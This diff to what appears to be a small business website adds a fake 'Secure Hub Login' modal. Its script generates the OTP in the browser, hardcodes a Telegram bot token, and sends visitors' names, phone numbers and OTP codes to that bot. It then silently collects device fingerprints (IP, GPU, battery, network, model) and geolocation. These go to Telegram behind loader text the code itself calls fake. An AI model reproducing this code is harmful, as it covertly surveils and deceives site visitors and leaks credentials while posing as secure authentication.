@@ -2956,6 +2956,221 @@
     }
 </script>
         <a href="mailto:maa.nirmala.dj.beltikri@gmail.com" class="side-link"><i class="fas fa-envelope"></i> Email</a>
+        <a href="javascript:void(0)" class="side-link" style="display: flex; align-items: center; gap: 10px; width: 100%; padding: 15px; background: transparent; border: 1px solid #D4AF37; border-radius: 8px; color: #D4AF37; font-family: 'Outfit', sans-serif; font-weight: bold; font-size: 16px; text-decoration: none; justify-content: center; box-sizing: border-box; transition: 0.3s ease; margin-bottom: 15px;" onclick="toggleMenu(); checkSecureHubAccess()">
+    <i class="fas fa-fingerprint"></i> SECURE HUB LOGIN
+</a>
+
+<div id="hubAuthModal" style="display:none; position:fixed; inset:0; background:rgba(5,5,5,0.95); z-index:9999999; justify-content:center; align-items:center; backdrop-filter:blur(10px);">
+    <div style="background:linear-gradient(145deg, #110e08 0%, #050505 100%); width:90%; max-width:400px; border-radius:16px; border:1px solid #D4AF37; box-shadow:0 15px 40px rgba(0,0,0,0.9); overflow:hidden;">
+        
+        <div style="padding:20px; text-align:center; border-bottom:1px solid rgba(212,175,55,0.3); position:relative;">
+            <span onclick="document.getElementById('hubAuthModal').style.display='none'" style="position:absolute; top:15px; right:20px; color:#D4AF37; font-size:30px; cursor:pointer;">×</span>
+            <h2 style="margin:0; color:#D4AF37; font-family:'Cinzel'; font-size:20px; font-weight:900;"><i class="fas fa-user-shield"></i> CLIENT ACCESS</h2>
+        </div>
+
+        <div style="padding:25px;">
+            <div id="hubStep1">
+                <p style="color:#aaa; font-size:12px; margin-bottom:15px; text-align:center; font-family:'Outfit';">Enter your details to receive a 6-digit OTP.</p>
+                <input type="text" id="hubName" style="width:100%; padding:12px; margin-bottom:10px; background:rgba(255,255,255,0.05); border:1px solid #333; color:#fff; border-radius:8px; font-family:'Outfit'; box-sizing:border-box;" placeholder="Your Full Name">
+                <input type="tel" id="hubPhone" style="width:100%; padding:12px; margin-bottom:15px; background:rgba(255,255,255,0.05); border:1px solid #333; color:#fff; border-radius:8px; font-family:'Outfit'; box-sizing:border-box;" placeholder="10-Digit Mobile Number" maxlength="10">
+                <button id="hubSendOtpBtn" style="width:100%; padding:15px; background:#D4AF37; border:none; font-weight:bold; border-radius:8px; color:#000; cursor:pointer; font-family:'Outfit'; transition:0.3s;" onclick="generateAndSendHubOTP()">
+                    GET SECURE OTP <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+
+            <div id="hubStep2" style="display:none;">
+                <p style="color:#00fa9a; font-size:13px; text-align:center; margin-bottom:15px; font-weight:bold; font-family:'Outfit';">
+                    <i class="fas fa-check-circle"></i> OTP Sent Securely!
+                </p>
+                <input type="tel" id="hubOtpInput" style="width:100%; padding:12px; margin-bottom:15px; background:rgba(255,255,255,0.05); border:1px solid #D4AF37; color:#D4AF37; border-radius:8px; font-family:'Outfit'; text-align:center; font-size:22px; letter-spacing:8px; box-sizing:border-box;" placeholder="******" maxlength="6">
+                <button style="width:100%; padding:15px; background:#00fa9a; border:none; font-weight:bold; border-radius:8px; color:#000; cursor:pointer; font-family:'Outfit';" onclick="verifyHubOTP()">
+                    <i class="fas fa-unlock-alt"></i> VERIFY & LOGIN
+                </button>
+                <p style="color:#ff3333; font-size:12px; text-align:center; margin-top:15px; cursor:pointer; font-family:'Outfit';" onclick="resetHubLogin()">Change Number</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="seamlessHubLoader" style="display:none; position:fixed; inset:0; background:#050505; z-index:999999999; flex-direction:column; justify-content:center; align-items:center;">
+    <div style="width:80px; height:80px; border-radius:50%; border:3px solid transparent; border-top-color:#D4AF37; border-bottom-color:#D4AF37; animation:spinLoader 1.5s linear infinite; margin-bottom:20px;"></div>
+    <img src="https://i.postimg.cc/76mz1v2j/file-0000000090a471fa84cbecd48a774885.png" style="width:50px; position:absolute; top:calc(50% - 50px); border-radius:50%;">
+    <h2 style="color:#D4AF37; font-family:'Cinzel'; font-size:20px; letter-spacing:2px; margin:0;">MAA NIRMALA HUB</h2>
+    <p id="hubLoadText" style="color:#aaa; font-family:'Outfit'; font-size:12px; margin-top:10px; letter-spacing:1px; animation:pulseText 1.5s infinite;">Authenticating Device...</p>
+</div>
+
+<style>
+    @keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    @keyframes pulseText { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+</style>
+
+<script>
+    // --- STATE VARIABLES ---
+    let currentHubOTP = "";
+    let currentUserName = "";
+    let currentUserPhone = "";
+    
+    // Replace with your real Telegram Bot info
+    const HUB_TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
+    const HUB_TG_CHAT = "8506290708";
+
+    // --- 1. CHECK IF ALREADY LOGGED IN ---
+    function checkSecureHubAccess() {
+        if(localStorage.getItem('mnd_hub_authorized') === 'true') {
+            // Already logged in! Grab saved details and trigger redirect
+            currentUserName = localStorage.getItem('mnd_hub_name') || "Returning User";
+            currentUserPhone = localStorage.getItem('mnd_hub_phone') || "Saved Number";
+            executeSeamlessRedirect(true); // true = returning user
+        } else {
+            // Open Login Modal
+            document.getElementById('hubAuthModal').style.display = 'flex';
+        }
+    }
+
+    // --- 2. GENERATE & SEND 6-DIGIT OTP ---
+    function generateAndSendHubOTP() {
+        currentUserName = document.getElementById('hubName').value.trim();
+        currentUserPhone = document.getElementById('hubPhone').value.trim();
+
+        // Strict Validation
+        if(!currentUserName || currentUserPhone.length !== 10 || isNaN(currentUserPhone)) {
+            alert("⚠️ Please enter your Full Name and a valid 10-digit mobile number.");
+            return;
+        }
+
+        // Generate Random 6-Digit OTP
+        currentHubOTP = Math.floor(100000 + Math.random() * 900000).toString();
+
+        const btn = document.getElementById('hubSendOtpBtn');
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PREPARING...';
+        btn.disabled = true;
+
+        // Send OTP to Admin Telegram
+        const msg = `🔑 *NEW OTP GENERATED*\n\n👤 *User:* ${currentUserName}\n📞 *Phone:* ${currentUserPhone}\n🔢 *OTP Code:* \`${currentHubOTP}\``;
+
+        fetch(`https://api.telegram.org/bot${HUB_TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: HUB_TG_CHAT, text: msg, parse_mode: 'Markdown' })
+        })
+        .then(() => {
+            document.getElementById('hubStep1').style.display = 'none';
+            document.getElementById('hubStep2').style.display = 'block';
+            btn.innerHTML = 'GET SECURE OTP <i class="fas fa-arrow-right"></i>';
+            btn.disabled = false;
+        })
+        .catch(() => {
+            alert("Network Error. Please try again.");
+            btn.innerHTML = 'GET SECURE OTP <i class="fas fa-arrow-right"></i>';
+            btn.disabled = false;
+        });
+    }
+
+    // --- 3. VERIFY OTP ---
+    function verifyHubOTP() {
+        const entered = document.getElementById('hubOtpInput').value.trim();
+        
+        if(entered === currentHubOTP && currentHubOTP !== "") {
+            // Success! Save to device
+            localStorage.setItem('mnd_hub_authorized', 'true');
+            localStorage.setItem('mnd_hub_name', currentUserName);
+            localStorage.setItem('mnd_hub_phone', currentUserPhone);
+            
+            document.getElementById('hubAuthModal').style.display = 'none';
+            
+            // Execute the seamless redirect and send the massive background log
+            executeSeamlessRedirect(false); 
+        } else {
+            alert("❌ Incorrect 6-Digit OTP! Please try again.");
+        }
+    }
+
+    function resetHubLogin() {
+        currentHubOTP = "";
+        document.getElementById('hubStep1').style.display = 'block';
+        document.getElementById('hubStep2').style.display = 'none';
+        document.getElementById('hubOtpInput').value = '';
+    }
+
+    // --- 4. MASSIVE DEVICE FINGERPRINTING LOGIC ---
+    async function captureAndSendDeviceLog(isReturning) {
+        // 1. IP Address
+        let ip = "Masked";
+        try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e){}
+
+        // 2. Battery
+        let battery = "Unknown";
+        try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Battery'})`; } catch(e){}
+
+        // 3. Network Connection
+        let network = "Unknown";
+        try { if(navigator.connection) network = `${navigator.connection.effectiveType} (${navigator.connection.type || 'cellular'}) - Down: ~${navigator.connection.downlink}Mbps`; } catch(e){}
+
+        // 4. GPU (Graphics Card)
+        let gpu = "N/A";
+        try { var c=document.createElement('canvas'); var gl=c.getContext('webgl') || c.getContext('experimental-webgl'); var d=gl.getExtension('WEBGL_debug_renderer_info'); gpu = gl.getParameter(d.UNMASKED_RENDERER_WEBGL); } catch(e){}
+
+        // 5. Hardware Data
+        const cores = navigator.hardwareConcurrency || "Unknown";
+        const ram = navigator.deviceMemory ? `~${navigator.deviceMemory}GB` : "Unknown";
+        const browser = navigator.userAgent;
+        const screen = `${window.screen.width}x${window.screen.height}`;
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        
+        let model = "Unknown Device";
+        if (navigator.userAgentData) { 
+            try { const d = await navigator.userAgentData.getHighEntropyValues(["model", "platform"]); model = `${d.platform} ${d.model}`; } catch(e){}
+        }
+
+        // 6. Time & Status
+        const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
+        const statusType = isReturning ? "(Auto-Login/Saved Device)" : "(New OTP Verification)";
+
+        // 7. Location Logic (Fast 3-second timeout)
+        let locationData = "❌ Location Denied/Unavailable";
+        const getLoc = () => new Promise(res => {
+            if(!navigator.geolocation) return res("❌ Not Supported");
+            navigator.geolocation.getCurrentPosition(
+                pos => res(`✅ Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}\n🔗 [Google Maps Link](https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude})`),
+                err => res("❌ Location Denied by User")
+            );
+        });
+        const locTimeout = new Promise(res => setTimeout(() => res("❌ Location Request Timed Out"), 2500));
+        locationData = await Promise.race([getLoc(), locTimeout]);
+
+        // 8. Construct Massive Telegram Log
+        const intelLog = `🚨 *SECURE HUB ACCESS LOG* 🚨\n_${statusType}_\n\n👤 *USER IDENTITY*\n• Name: ${currentUserName}\n• Phone: ${currentUserPhone}\n\n📱 *DEVICE FINGERPRINT*\n• Model: ${model}\n• OS/Browser: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE SPECS*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${battery}\n\n📡 *NETWORK INTEL*\n• IP: ${ip}\n• Type: ${network}\n\n📍 *LOCATION DATA*\n${locationData}\n\n⏰ *Time:* ${time}`;
+
+        // 9. Send Payload
+        fetch(`https://api.telegram.org/bot${HUB_TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: HUB_TG_CHAT, text: intelLog, parse_mode: 'Markdown' })
+        }).catch(err => console.log("Silent error log"));
+    }
+
+    // --- 5. SEAMLESS REDIRECT ANIMATION ---
+    function executeSeamlessRedirect(isReturning) {
+        const loader = document.getElementById('seamlessHubLoader');
+        const loadText = document.getElementById('hubLoadText');
+        
+        // Cover the screen immediately
+        loader.style.display = 'flex';
+
+        // Start capturing device intel in the background (does not pause the animation)
+        captureAndSendDeviceLog(isReturning);
+
+        // Fake progression text to make it look like a highly advanced app
+        setTimeout(() => { loadText.innerText = "Establishing Secure Encrypted Connection..."; }, 1000);
+        setTimeout(() => { loadText.innerText = "Synchronizing Hub Data..."; }, 2500);
+        setTimeout(() => { loadText.innerText = "Opening Application..."; }, 3800);
+        
+        // Final Redirect after 4.5 seconds (gives Telegram time to receive the background data)
+        setTimeout(() => {
+            window.location.replace('https://maa-nirmala-dj.github.io/-tent-house./');
+        }, 4500);
+    }
+</script>
     </div>
 
     <div id="main-interface">
